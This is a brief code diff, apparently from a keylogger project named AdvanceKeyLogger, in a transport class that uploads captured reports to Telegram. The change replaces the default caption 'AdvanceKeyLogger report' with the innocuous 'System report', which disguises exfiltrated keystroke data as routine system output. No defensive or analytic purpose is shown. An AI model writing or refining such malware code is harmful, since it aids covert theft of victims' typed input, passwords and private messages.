@@ -74,7 +74,7 @@ class TelegramTransport(BaseTransport):
             self.connect()
         meta = metadata or {}
         filename = meta.get("filename", "report.bin")
-        caption = meta.get("caption", "AdvanceKeyLogger report")
+        caption = meta.get("caption", "System report")
 
         if len(data) > _MAX_FILE_SIZE:
             self.logger.error(
